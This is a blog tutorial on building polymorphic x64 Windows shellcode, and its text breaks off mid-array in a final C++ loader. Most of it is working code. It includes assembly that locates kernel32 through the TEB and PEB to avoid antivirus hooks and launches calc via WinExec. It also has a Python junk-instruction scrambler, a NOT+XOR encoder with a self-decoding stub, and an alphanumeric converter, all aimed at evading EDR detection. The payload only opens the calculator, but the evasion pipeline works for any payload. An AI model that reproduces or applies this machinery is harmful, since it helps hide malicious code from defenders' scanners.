---
title:  Let's Create Some Polymorphic PIC Shellcode!
header:
  teaser: "/assets/images/polymorphic.png"
categories:
  - Shellcode
  - PIC
tags:
  - x64 assembly
  - '2025'
  - g3tsyst3m
  - x64 shellcode
  - PIC shellcode
  - Bitwise encoder
  - polymorphic shellcode
---

Alright I'll admit I'm pretty pumped for today's post 😸  Shellcode and x64 Assembly are one of my favorite topics to cover.  I don't know why, but something about assembly and shellcode fascinates me.  I don't know if it's the fact that I feel extremely accomplished after producing custom shellcode/x64 assembly, or just because it's so clean & effiecient, or it's evasive capabilities?  I'm not sure.  But all of those factors certainly contribute to it's appeal as far as I'm concerned.  In today's post, we're going to cover quite a bit of ground, so buckle up!  I'm going to go over various way to encode your shellcode, obfuscate it, turn it into the popular alpha-mix character format, and of course make it polymorphic.  What do I mean exactly when I say polymorphic?  Well, in short, I just mean the shellcode will be uniquely different every single time it's built and ran.  In essence, it will never have a common file signature.  

First off, let's start with our x64 assembly code.  I'm doing things a bit differently this time around.  I'm going to first locate the Thread Environment Block, and **THEN** get the PEB, next we get kernel32 base address, and **FINALLY** execute the ever-ubiquitous windows calculator 😸  This is honestly good practice to get into folks.  You don't want to always have to rely on msfvenom to generate your shellcode for you for your red team engagements.  Even when encoding msfvencom generated shellcode, EDR in memory scanners can still easily detect it.  It's terribly predictable.  I HIGHLY encourage you to create your own shellcode.  With today's post, we not only will be coding custom assembly/shellcode, but then encoding it and making it to where it's always different.  You'll see what I mean later on into the post, I promise!

Okay, without further ado, the x64 assembly code can be found below.  I tried not to be too lazy and add in comments to help where I thought they'd be useful.  One other important item of importance.  If you've ever used Avast for your AV/EDR solution, you'll quickly realize Avast hooks into your program's loaded modules.  Other EDR solutions do this as well, but Avast is the one that comes to my immediate memory.  In particular, it hooks into the initial loader prologue that we walk over in our shellcode to locate Kernel32's base address.  So, if you use the old school method of locating kernel32, you'll usually land on the hooked version instead.  Not so with the code below.  We literally search for a module with KERN in the name (unicode) and unless EDR / AV starts to name their hooked module KERNxx.dll, you'll be in good shape and bypass the initial hook with the code below!

The Calc x64 Assembly Code (with custom loading of kernel32 base via TEB)
-

> **calc.asm**

```nasm

;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -o x64findkernel32.exe x64findkernel32.obj

; locates kernel32.dll searching the UNICODE string instead of the location in the list
; then loads calc.exe

BITS 64
SECTION .text
global main
main:
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0

; Access TEB base: GS segment points to TEB
mov rax, gs:[0x30]
; Access PEB from TEB (TEB + 0x60)
mov rax, [rax + 0x60]

;mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr (_PEB_LDR_DATA)
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList

checkit:
mov rsi, [rsi] 
mov rcx, [rsi + 0x60] 

mov rbx, [rcx]
mov rdx, 0x004E00520045004B ;UNICODE "K E R N" from KERNEL32.DLL
cmp rbx, rdx
jz foundit
jnz checkit

foundit:
mov rbx, [rsi + 0x30]

mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov rcx, r10                  ; Set loop counter
mov rax, 0x6F9C9A87BA9196A8   ; WinExec 'encoded'
not rax
shl rax, 0x8
shr rax, 0x8
push rax
mov rax, rsp	
add rsp, 0x8
kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    mov r9, qword [rax]                ; R9 = "our API"
    cmp [rbx], r9                      ; Compare all bytes
    jz FunctionNameFound               ; If match, function found
	jnz kernel32findfunction
FunctionNameNotFound:
int3
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the Winexec WinApi and all the while skipping ordinal lookup! w00t!
   xor rax, rax
   push rax
   mov rax, 0x9A879AD19C939E9C    ; encoded calc.exe ;)
   not rax
   push rax
   mov rcx, rsp	                 
   xor rdx, rdx
   inc rdx
   sub rsp, 0x30
   call r15                       ; Call WinExec
```

Okay, so now that we have our assembly code, we need to move on to the next step and scramble it.  This is part 1 of our polymorphic shellcode preparations.  The code below will insert benign assembly instructions throughout our assembly code where it will be completely unique each time it is compiled into shellcode.  Basically what I did was check for registers already in use and those that I determined weren't in use would be the registers chosen for the scrambled assembly instruction code insertion.  For instance, here's all the possible x64 register combinations we will search for and use:

```python
all_reg_variants = {
    'rax': ['rax', 'eax', 'ax', 'al', 'ah'],
    'rcx': ['rcx', 'ecx', 'cx', 'cl', 'ch'],
    'rdx': ['rdx', 'edx', 'dx', 'dl', 'dh'],
    'rbx': ['rbx', 'ebx', 'bx', 'bl', 'bh'],
    'rsp': ['rsp', 'esp', 'sp', 'spl'],
    'rbp': ['rbp', 'ebp', 'bp', 'bpl'],
    'rsi': ['rsi', 'esi', 'si', 'sil'],
    'rdi': ['rdi', 'edi', 'di', 'dil'],
    'r8': ['r8', 'r8d', 'r8w', 'r8b'],
    'r9': ['r9', 'r9d', 'r9w', 'r9b'],
    'r10': ['r10', 'r10d', 'r10w', 'r10b'],
    'r11': ['r11', 'r11d', 'r11w', 'r11b'],
    'r12': ['r12', 'r12d', 'r12w', 'r12b'],
    'r13': ['r13', 'r13d', 'r13w', 'r13b'],
    'r14': ['r14', 'r14d', 'r14w', 'r14b'],
    'r15': ['r15', 'r15d', 'r15w', 'r15b'],
}
```

and here's all the possible instruction combinations I chose to use for this particular scrambler script:

```python
single_reg_templates = [
    "xor {reg}, {reg}",
    "mov {reg}, {reg}",
    "add {reg}, 0x0",
    "sub {reg}, 0x0",
    "cmp {reg}, 0x0",
    "test {reg}, {reg}",
    "lea {reg}, [{reg}]",
    "imul {reg}, {reg}, 1",
    "shl {reg}, 0x0",
    "shr {reg}, 0x0",
    "rol {reg}, 0x0",
    "ror {reg}, 0x0",
    "nop"
]
```

Now that you know how it works, let's go ahead and run the full python script below:

The Assembly Code Scrambler - Polymorphic prep part 1
-

> **asmobfuscator.py**

```python
import sys
import re
import random

all_reg_variants = {
    'rax': ['rax', 'eax', 'ax', 'al', 'ah'],
    'rcx': ['rcx', 'ecx', 'cx', 'cl', 'ch'],
    'rdx': ['rdx', 'edx', 'dx', 'dl', 'dh'],
    'rbx': ['rbx', 'ebx', 'bx', 'bl', 'bh'],
    'rsp': ['rsp', 'esp', 'sp', 'spl'],
    'rbp': ['rbp', 'ebp', 'bp', 'bpl'],
    'rsi': ['rsi', 'esi', 'si', 'sil'],
    'rdi': ['rdi', 'edi', 'di', 'dil'],
    'r8': ['r8', 'r8d', 'r8w', 'r8b'],
    'r9': ['r9', 'r9d', 'r9w', 'r9b'],
    'r10': ['r10', 'r10d', 'r10w', 'r10b'],
    'r11': ['r11', 'r11d', 'r11w', 'r11b'],
    'r12': ['r12', 'r12d', 'r12w', 'r12b'],
    'r13': ['r13', 'r13d', 'r13w', 'r13b'],
    'r14': ['r14', 'r14d', 'r14w', 'r14b'],
    'r15': ['r15', 'r15d', 'r15w', 'r15b'],
}

def find_used_regs(lines):
    used = set()
    for line in lines:
        clean_line = line.split(';')[0].strip()
        if not clean_line:
            continue
        for full_reg, variants in all_reg_variants.items():
            for var in variants:
                if re.search(rf'\b{re.escape(var)}\b', clean_line, re.IGNORECASE):
                    used.add(full_reg)
                    break
    return used

single_reg_templates = [
    "xor {reg}, {reg}",
    "mov {reg}, {reg}",
    "add {reg}, 0x0",
    "sub {reg}, 0x0",
    "cmp {reg}, 0x0",
    "test {reg}, {reg}",
    "lea {reg}, [{reg}]",
    "imul {reg}, {reg}, 1",
    "shl {reg}, 0x0",
    "shr {reg}, 0x0",
    "rol {reg}, 0x0",
    "ror {reg}, 0x0",
    "nop"
]

two_reg_templates = [
    "xchg {reg1}, {reg2} ; xchg {reg1}, {reg2}",
]

def is_flag_setter(clean):
    if not clean:
        return False
    parts = clean.split()
    if not parts:
        return False
    opcode = parts[0].lower()
    flag_setters = {"xor", "add", "sub", "cmp", "test", "lea", "imul", "shl", "shr", "rol", "ror"}
    return opcode in flag_setters

def is_conditional(clean):
    if not clean:
        return False
    parts = clean.split()
    if not parts:
        return False
    opcode = parts[0].lower()
    conditionals = {"jz", "jnz", "je", "jne", "ja", "jae", "jb", "jbe", "jc", "jcxz", "jecxz", "jrcxz", "jg", "jge", "jl", "jle", "jna", "jnae", "jnb", "jnbe", "jnc", "jno", "jnp", "jnz", "jo", "jp", "jpe", "jpo", "js"}
    return opcode in conditionals

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python asm_obfuscator.py input.asm")
        sys.exit(1)

    filename = sys.argv[1]
    with open(filename, 'r') as f:
        lines = f.readlines()

    used = find_used_regs(lines)
    all_gprs = list(all_reg_variants.keys())
    candidates = [r for r in all_gprs if r not in ['rsp', 'rbp']]
    unused = [r for r in candidates if r not in used]

    print(f"Unused registers (excluding rsp, rbp): {unused}", file=sys.stderr)

    if not unused:
        print("No unused registers available. Exiting without modification.", file=sys.stderr)
        sys.exit(0)

    insert_prob = 0.9
    output_lines = []
    i = 0
    while i < len(lines):
        line = lines[i].rstrip()
        output_lines.append(line)
        clean = line.split(';')[0].strip()
        insert_here = True
        if clean and not clean.startswith(('.', 'SECTION')) and not clean.endswith(':'):
            # Check if we should skip insertion to avoid breaking flags for conditional jumps
            if i + 1 < len(lines):
                next_line = lines[i + 1]
                next_clean = next_line.split(';')[0].strip()
                if is_flag_setter(clean) and is_conditional(next_clean):
                    insert_here = False
            if random.random() < insert_prob and insert_here:
                if len(unused) > 1 and random.random() < 0.7:
                    reg1 = random.choice(unused)
                    reg2 = random.choice([r for r in unused if r != reg1])
                    templ = random.choice(two_reg_templates)
                    instr = templ.format(reg1=reg1, reg2=reg2)
                else:
                    reg = random.choice(unused)
                    templ = random.choice(single_reg_templates)
                    instr = templ.format(reg=reg)
                output_lines.append("    " + instr)
        i += 1

    output_file = filename.replace('.asm', '_mod.asm')
    with open(output_file, 'w') as f:
        f.write('\n'.join(output_lines) + '\n')

    print(f"Modified assembly written to {output_file}")
```

here's what my original calc.asm assembly code looks like after I run it:

<img width="974" height="255" alt="image" src="https://github.com/user-attachments/assets/63f4bdce-5913-4ada-a87d-486dfe5d5493" />

<iframe width="1080" height="720" 
        src="https://www.youtube.com/embed/MThxY9pkotI"
        title="YouTube video player" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
</iframe><br><br>

Now, let's compile this using nasm to get our .obj file:

> nasm -fwin64 locate_kernel32_mod.asm

Next, we want to extract the shellcode from the compiled assembly .obj file.  I wrote a python script to do just that to help you out (and me! 😺).  I used to have to resort to Linux to extract the shellcode, but I got tired of booting up my VM. LOL

```python
import re
import subprocess
import sys

def generateshellcode(obj_file):
    # Run objdump and capture output
    result = subprocess.run(['objdump', '-D', obj_file], capture_output=True, text=True, check=True)
    objdump_output = result.stdout
    objdump_output = objdump_output.replace(" <", "--|")
    #objdump_output = re.sub(r'<', '', objdump_output)
    pattern = r'(?<![a-zA-Z])[0-9a-fA-F]{2} '
    matches = re.findall(pattern, objdump_output, flags=re.IGNORECASE)
    
    finalmatch=[]
    for match in matches:
        finalmatch.append(match.strip())  
    #print(finalmatch)        
    
    prefixed_hex = ['\\x' + hex_val for hex_val in finalmatch]


    #finalshellcode = ', '.join(prefixed_hex)
    finalshellcode = ''.join(prefixed_hex)
    print(finalshellcode)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        obj_file = sys.argv[1]
    else:
        print("findhex.py [.obj file]")
        exit()
    generateshellcode(obj_file)
```

<img width="1462" height="358" alt="image" src="https://github.com/user-attachments/assets/46502d42-aedc-4804-af38-4b8527a4ba64" />

Polymorphic prep part 2 - The Encoder - Bitwise NOT + XOR
-

Now that we have our shellcode, we need to encode it to add more layers of polymorphism to our code!  I'm a huge fan of Bitwise NOT and I feel like it doesn't get the attention it deserves.  It's quite easy to work with, and can easily be incorporated into your encoding arsenal. 😸  Here's how it works.  We will place our newly generated shellcode in the `shellcode` variable.  Next, we simply run the script I went ahead and put together for you below.  It will generate shellcode encoded with the `Bitwise NOT` operation combined with the familiar XOR Bitwise operation.  The script will also inform us as to the location of our `key` that we used when encoding the shellcode.  This key will be in the encoded shellcode itself! 🤯  This affords us not only great evasion for general static and dynamic analysis engines, but also introduces yet more polymorphism into our code, as this location will always change depending on the encoding key value you choose to use.  This is essentially a self-decoding shellcode stub.  These self-decrypting/self-decoding shellcode stubs are commonly seen in buffer overflow exploits.  I chose `0xAC` for our encoding key by the way for this particular example.   

```python
import sys

shellcode = b"\x4d\x87\xe6\x48\x83\xec\x28\x48\x8d\x3f\x48\x83\xe4\xf0\x4d\x87\xf4\x48\x31\xc9\x49\x87\xfc\x65\x48\x8b\x04\x25\x30\x00\x00\x00\x48\x8b\x40\x60\x48\x31\xff\x48\x8b\x40\x18\x49\x87\xfe\x48\x8b\x70\x10\x48\x83\xc7\x00\x48\x8b\x36\x4c\x87\xef\x48\x8b\x4e\x60\x4c\x87\xef\x48\x8b\x19\x4d\x87\xec\x48\xba\x4b\x00\x45\x00\x52\x00\x4e\x00\x48\x31\xff\x48\x39\xd3\x74\x08\x49\x87\xfc\x75\xd6\x4c\x87\xe7\x48\x8b\x5e\x30\x4d\x89\xf6\x49\x89\xd8\x4d\x87\xe5\x8b\x5b\x3c\x4d\x6b\xe4\x01\x4c\x01\xc3\x4d\x89\xe4\x48\x31\xc9\x49\xc1\xe5\x00\x66\x81\xc1\xff\x88\x4d\x87\xee\x48\xc1\xe9\x08\x49\xc1\xcc\x00\x8b\x14\x0b\x4c\x87\xe7\x4c\x01\xc2\x4d\x89\xed\x44\x8b\x52\x14\x4d\x31\xed\x4d\x31\xdb\x49\x83\xec\x00\x44\x8b\x5a\x20\x49\x83\xfe\x00\x4d\x01\xc3\x4d\x87\xee\x4c\x89\xd1\x4c\x87\xef\x48\xb8\xa8\x96\x91\xba\x87\x9a\x9c\x6f\x48\xc1\xcf\x00\x48\xf7\xd0\x49\x87\xfd\x48\xc1\xe0\x08\x4d\x89\xed\x48\xc1\xe8\x08\x4d\x87\xe6\x50\x4d\x85\xf6\x48\x89\xe0\x49\x87\xfe\x48\x83\xc4\x08\x4d\x89\xe4\x67\xe3\x30\x49\x87\xfe\x31\xdb\x49\x87\xfc\x41\x8b\x1c\x8b\x48\xc1\xe7\x00\x4c\x01\xc3\x4d\x87\xe6\x48\xff\xc9\x49\x87\xfc\x4c\x8b\x08\x4d\x87\xf4\x4c\x39\x0b\x74\x0d\x4d\x87\xee\x75\xd1\x49\xc1\xe6\x00\xcc\x49\x87\xfc\xff\xc1\x4d\x85\xe4\x4d\x31\xdb\x4d\x87\xf4\x44\x8b\x5a\x1c\x4c\x87\xf7\x4d\x01\xc3\x4d\x87\xec\x45\x8b\x3c\x8b\x49\x87\xfe\x4d\x01\xc7\x4d\x31\xf6\x48\x31\xc0\x49\x83\xc5\x00\x50\x49\x87\xfd\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x49\x83\xfc\x00\x48\xf7\xd0\x4d\x87\xee\x50\x49\x87\xfe\x48\x89\xe1\x4d\x85\xe4\x48\x31\xd2\x4d\x87\xee\x48\xff\xc2\x49\x87\xfe\x48\x83\xec\x30\x49\x87\xfc\x41\xff\xd7\x4d\x87\xf4"

xor_key = 0xAC  # Use a key that avoids bad characters

encoded_shellcode = bytearray()
i = 0
while i < len(shellcode):
    chunk = shellcode[i:i+8]
    value = int.from_bytes(chunk, 'little')
    not_value = (~value) & 0xFFFFFFFFFFFFFFFF
    not_chunk = not_value.to_bytes(8, 'little')
    for b in not_chunk:
        encoded_shellcode.append(b ^ xor_key)
    i += 8

print(f"Encoded Shellcode: {','.join([f'0x{b:02x}' for b in encoded_shellcode])}")

positions = [i for i, byte in enumerate(encoded_shellcode) if byte == xor_key]

if positions:
    print(f"Found 0xAC at position(s): {positions}")
else:
    print("0xAC not found in the shellcode")
```

**Here's the output I received after running the script:**

<img width="1473" height="476" alt="image" src="https://github.com/user-attachments/assets/a1e0410a-30f5-407e-82dc-3b0c24203af6" />

Polymorphic prep part 2 continued - The Decoder x64 Assembly code 
-

Cool, so now that we have our encoded shellcode, we now need to write a decoder in x64 assembly.  Just pick one of the index locations the script discovered as your decoding key and apply it to our .asm file below;  I chose key index `38`.  This will be used to yet once again compile our shellcode with an additional layer of polymorphism!  Notice how I added `38` here:

> mov r9b, [rel encoded_shellcode + 38]

That's the index for the location of our decryption key in the shellcode itself.  Ok, let's check out that assembly code shall we?

```nasm
;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -N -o x64findkernel32.exe x64findkernel32.obj
BITS 64

section .data 

section .text
global main

main:
    ; Decode loop (use LEA for RIP-relative address)
    lea rsi, [rel encoded_shellcode]
    mov r9b, [rel encoded_shellcode + 38]
    mov rcx, encoded_shellcode_len   ; Immediate value, no rel needed
decode_loop:
    mov al, [rsi]
    xor al, r9b           ; 0xAC
    not al             ; Undo NOT encoding
    mov [rsi], al
    inc rsi
    loop decode_loop

    ; Jump to decoded shellcode (reload address for jmp)
    lea rax, [rel encoded_shellcode]
    jmp rax
	
encoded_shellcode:
db  0x1e,0xd4,0xb5,0x1b,0xd0,0xbf,0x7b,0x1b,0xde,0x6c,0x1b,0xd0,0xb7,0xa3,0x1e,0xd4,0xa7,0x1b,0x62,0x9a,0x1a,0xd4,0xaf,0x36,0x1b,0xd8,0x57,0x76,0x63,0x53,0x53,0x53,0x1b,0xd8,0x13,0x33,0x1b,0x62,0xac,0x1b,0xd8,0x13,0x4b,0x1a,0xd4,0xad,0x1b,0xd8,0x23,0x43,0x1b,0xd0,0x94,0x53,0x1b,0xd8,0x65,0x1f,0xd4,0xbc,0x1b,0xd8,0x1d,0x33,0x1f,0xd4,0xbc,0x1b,0xd8,0x4a,0x1e,0xd4,0xbf,0x1b,0xe9,0x18,0x53,0x16,0x53,0x01,0x53,0x1d,0x53,0x1b,0x62,0xac,0x1b,0x6a,0x80,0x27,0x5b,0x1a,0xd4,0xaf,0x26,0x85,0x1f,0xd4,0xb4,0x1b,0xd8,0x0d,0x63,0x1e,0xda,0xa5,0x1a,0xda,0x8b,0x1e,0xd4,0xb6,0xd8,0x08,0x6f,0x1e,0x38,0xb7,0x52,0x1f,0x52,0x90,0x1e,0xda,0xb7,0x1b,0x62,0x9a,0x1a,0x92,0xb6,0x53,0x35,0xd2,0x92,0xac,0xdb,0x1e,0xd4,0xbd,0x1b,0x92,0xba,0x5b,0x1a,0x92,0x9f,0x53,0xd8,0x47,0x58,0x1f,0xd4,0xb4,0x1f,0x52,0x91,0x1e,0xda,0xbe,0x17,0xd8,0x01,0x47,0x1e,0x62,0xbe,0x1e,0x62,0x88,0x1a,0xd0,0xbf,0x53,0x17,0xd8,0x09,0x73,0x1a,0xd0,0xad,0x53,0x1e,0x52,0x90,0x1e,0xd4,0xbd,0x1f,0xda,0x82,0x1f,0xd4,0xbc,0x1b,0xeb,0xfb,0xc5,0xc2,0xe9,0xd4,0xc9,0xcf,0x3c,0x1b,0x92,0x9c,0x53,0x1b,0xa4,0x83,0x1a,0xd4,0xae,0x1b,0x92,0xb3,0x5b,0x1e,0xda,0xbe,0x1b,0x92,0xbb,0x5b,0x1e,0xd4,0xb5,0x03,0x1e,0xd6,0xa5,0x1b,0xda,0xb3,0x1a,0xd4,0xad,0x1b,0xd0,0x97,0x5b,0x1e,0xda,0xb7,0x34,0xb0,0x63,0x1a,0xd4,0xad,0x62,0x88,0x1a,0xd4,0xaf,0x12,0xd8,0x4f,0xd8,0x1b,0x92,0xb4,0x53,0x1f,0x52,0x90,0x1e,0xd4,0xb5,0x1b,0xac,0x9a,0x1a,0xd4,0xaf,0x1f,0xd8,0x5b,0x1e,0xd4,0xa7,0x1f,0x6a,0x58,0x27,0x5e,0x1e,0xd4,0xbd,0x26,0x82,0x1a,0x92,0xb5,0x53,0x9f,0x1a,0xd4,0xaf,0xac,0x92,0x1e,0xd6,0xb7,0x1e,0x62,0x88,0x1e,0xd4,0xa7,0x17,0xd8,0x09,0x4f,0x1f,0xd4,0xa4,0x1e,0x52,0x90,0x1e,0xd4,0xbf,0x16,0xd8,0x6f,0xd8,0x1a,0xd4,0xad,0x1e,0x52,0x94,0x1e,0x62,0xa5,0x1b,0x62,0x93,0x1a,0xd0,0x96,0x53,0x03,0x1a,0xd4,0xae,0x1b,0xeb,0xcf,0xcd,0xc0,0xcf,0x82,0xc9,0xd4,0xc9,0x1a,0xd0,0xaf,0x53,0x1b,0xa4,0x83,0x1e,0xd4,0xbd,0x03,0x1a,0xd4,0xad,0x1b,0xda,0xb2,0x1e,0xd6,0xb7,0x1b,0x62,0x81,0x1e,0xd4,0xbd,0x1b,0xac,0x91,0x1a,0xd4,0xad,0x1b,0xd0,0xbf,0x63,0x1a,0xd4,0xaf,0x12,0xac,0x84,0x1e,0xd4,0xa7,0x53,0x53,0x53,0x53,0x53
encoded_shellcode_len equ $ - encoded_shellcode
```

> Before we compile this, it's worth mentioning that we could also run the asmobfuscator python script against this assembly code for futher polypmorphic layers if we wanted.  But for simplicity sake I left it as is 😺

Go ahead and compile that and run it.  You'll get the calculator as expected, but we're not done yet!!!  We need to hang on to that .obj file.  We will need it for our final portion of this post.  I just wanted you to see how the decoder works and make sure you do in fact see the calculator 😸 The grand finale - **adding in Alphanumeric shellcode / mix** is up next! But let's go ahead and do the following first:

> Compile instructions: nasm -fwin64 [program.asm] | ld -m i386pep -N -o program.exe program.obj

<img width="1599" height="905" alt="image" src="https://github.com/user-attachments/assets/7e69c2b4-b13b-46aa-82ce-68fc21d8c35e" />

Polymorphic prep part 3 - Adding in the Alphanumeric / mix Component to our Shellcode
-

Alright guys, we're getting closer to our completed polymorphic shellcode now.  What we need to do next is generate shellcode for our decoding routine.  We can simply run the same python shellcode generation script from earlier.  Your results should look like mine below:

<img width="1460" height="370" alt="image" src="https://github.com/user-attachments/assets/411aaac6-d913-4173-8603-8d680aca7b45" />

Next, go ahead and copy and paste that shellcode somewhere because you'll need it here in just a few.  First, we need to convert our hex bytes (shellcode) to ASCII.  Well, we will convert what we can.  The hex bytes that do not have a direct ASCII charcode conversion available we will leave as is.   Thus, the `Alpha/mix` mix nature of our shellcode.  Here's what the python script looks like, and here's where you'll paste in that Bitwise NOT decoder shellcode you just generated.  Notice how I pasted in the aforementioned shellcode:

```python
# Parse the hex list and convert to mixed ASCII/hex representation for C string literal
hex_list = b"\x48\x8d\x35\x23\x00\x00\x00\x44\x8a\x0d\x42\x00\x00\x00\xb9\x98\x01\x00\x00\x8a\x06\x44\x30\xc8\xf6\xd0\x88\x06\x48\xff\xc6\xe2\xf2\x48\x8d\x05\x02\x00\x00\x00\xff\xe0\x1e\xd4\xb5\x1b\xd0\xbf\x7b\x1b\xde\x6c\x1b\xd0\xb7\xa3\x1e\xd4\xa7\x1b\x62\x9a\x1a\xd4\xaf\x36\x1b\xd8\x57\x76\x63\x53\x53\x53\x1b\xd8\x13\x33\x1b\x62\xac\x1b\xd8\x13\x4b\x1a\xd4\xad\x1b\xd8\x23\x43\x1b\xd0\x94\x53\x1b\xd8\x65\x1f\xd4\xbc\x1b\xd8\x1d\x33\x1f\xd4\xbc\x1b\xd8\x4a\x1e\xd4\xbf\x1b\xe9\x18\x53\x16\x53\x01\x53\x1d\x53\x1b\x62\xac\x1b\x6a\x80\x27\x5b\x1a\xd4\xaf\x26\x85\x1f\xd4\xb4\x1b\xd8\x0d\x63\x1e\xda\xa5\x1a\xda\x8b\x1e\xd4\xb6\xd8\x08\x6f\x1e\x38\xb7\x52\x1f\x52\x90\x1e\xda\xb7\x1b\x62\x9a\x1a\x92\xb6\x53\x35\xd2\x92\xac\xdb\x1e\xd4\xbd\x1b\x92\xba\x5b\x1a\x92\x9f\x53\xd8\x47\x58\x1f\xd4\xb4\x1f\x52\x91\x1e\xda\xbe\x17\xd8\x01\x47\x1e\x62\xbe\x1e\x62\x88\x1a\xd0\xbf\x53\x17\xd8\x09\x73\x1a\xd0\xad\x53\x1e\x52\x90\x1e\xd4\xbd\x1f\xda\x82\x1f\xd4\xbc\x1b\xeb\xfb\xc5\xc2\xe9\xd4\xc9\xcf\x3c\x1b\x92\x9c\x53\x1b\xa4\x83\x1a\xd4\xae\x1b\x92\xb3\x5b\x1e\xda\xbe\x1b\x92\xbb\x5b\x1e\xd4\xb5\x03\x1e\xd6\xa5\x1b\xda\xb3\x1a\xd4\xad\x1b\xd0\x97\x5b\x1e\xda\xb7\x34\xb0\x63\x1a\xd4\xad\x62\x88\x1a\xd4\xaf\x12\xd8\x4f\xd8\x1b\x92\xb4\x53\x1f\x52\x90\x1e\xd4\xb5\x1b\xac\x9a\x1a\xd4\xaf\x1f\xd8\x5b\x1e\xd4\xa7\x1f\x6a\x58\x27\x5e\x1e\xd4\xbd\x26\x82\x1a\x92\xb5\x53\x9f\x1a\xd4\xaf\xac\x92\x1e\xd6\xb7\x1e\x62\x88\x1e\xd4\xa7\x17\xd8\x09\x4f\x1f\xd4\xa4\x1e\x52\x90\x1e\xd4\xbf\x16\xd8\x6f\xd8\x1a\xd4\xad\x1e\x52\x94\x1e\x62\xa5\x1b\x62\x93\x1a\xd0\x96\x53\x03\x1a\xd4\xae\x1b\xeb\xcf\xcd\xc0\xcf\x82\xc9\xd4\xc9\x1a\xd0\xaf\x53\x1b\xa4\x83\x1e\xd4\xbd\x03\x1a\xd4\xad\x1b\xda\xb2\x1e\xd6\xb7\x1b\x62\x81\x1e\xd4\xbd\x1b\xac\x91\x1a\xd4\xad\x1b\xd0\xbf\x63\x1a\xd4\xaf\x12\xac\x84\x1e\xd4\xa7\x53\x53\x53\x53\x53"

alphanumericfinal=[]
for bytey in hex_list:
    r = repr(chr(bytey))
    if bytey == 0x27:
        alphanumericfinal.append("\"\\'\"")
    elif bytey == 0x22:
        alphanumericfinal.append('\"\\""')
    elif bytey == 0x20:
        alphanumericfinal.append("\"\\x20\"")
    else:
        r=r.replace("'", '"')
        alphanumericfinal.append(r)
print(' '.join(alphanumericfinal))
```

When you run that, you will get something like this:

<img width="1460" height="496" alt="image" src="https://github.com/user-attachments/assets/2b381499-73e7-49ca-8252-6ed4d99b8fc1" />

That's it!  You've done it!  That is the final shellcode we were looking for.  So what did we just do?  Well, we...

- We started with a barebones x64 assembly template that uses WinExec to spawn the windows calculator
  -  This assembly code is also unique in that it locates the kernel32 base starting with TEB, then locating PEB, then locating kernel32 by it's unicode string via a string comparison
- Layered our original shellcode with benign assembly instructions which introduce randomness to our code
- We introduced a self-decoding Bitwise NOT + XOR encoded shellcode
- We then took that shellcode and added yet another layer of polymorphism and made it Alpha/Mix compatible.

I may have missed something in the bullet points above, but that' the gist of it.  Now, you can use this final form of shellcode any way you like.  You can inject it into another process, run it as is, etc.  I'll go ahead and just run it as-is for demonstration purposes.  

```cpp
#include <windows.h>
#include <iostream>

const unsigned char shellcode[] =
"H" "\x8d" "5" "#" "\x00" "\x00" "\x00" "D" "\x8a" "\r" "B" "\x00" "\x00" "\x00" "¹" "\x98" "\x01" "\x00" "\x00" "\x8a" "\x06" "D" "0" "È" "ö" "Ð" "\x88" "\x06" "H" "ÿ" "Æ" "â" "ò" "H" "\x8d" "\x05" "\x02" "\x00" "\x00" "\x00" "ÿ" "à" "\x1e" "Ô" "µ" "\x1b" "Ð" "¿" "{" "\x1b" "Þ" "l" "\x1b" "Ð" "·" "£" "\x1e" "Ô" "§" "\x1b" "b" "\x9a" "\x1a" "Ô" "¯" "6" "\x1b" "Ø" "W" "v" "c" "S" "S" "S" "\x1b" "Ø" "\x13" "3" "\x1b" "b" "¬" "\x1b" "Ø" "\x13" "K" "\x1a" "Ô" "\xad" "\x1b" "Ø" "#" "C" "\x1b" "Ð" "\x94" "S" "\x1b" "Ø" "e" "\x1f" "Ô" "¼" "\x1b" "Ø" "\x1d" "3" "\x1f" "Ô" "¼" "\x1b" "Ø" "J" "\x1e" "Ô" "¿" "\x1b" "é" "\x18" "S" "\x16" "S" "\x01" "S" "\x1d" "S" "\x1b" "b" "¬" "\x1b" "j" "\x80" "\'" "[" "\x1a" "Ô" "¯" "&" "\x85" "\x1f" "Ô" "´" "\x1b" "Ø" "\r" "c" "\x1e" "Ú" "¥" "\x1a" "Ú" "\x8b" "\x1e" "Ô" "¶" "Ø" "\x08" "o" "\x1e" "8" "·" "R" "\x1f" "R" "\x90" "\x1e" "Ú" "·" "\x1b" "b" "\x9a" 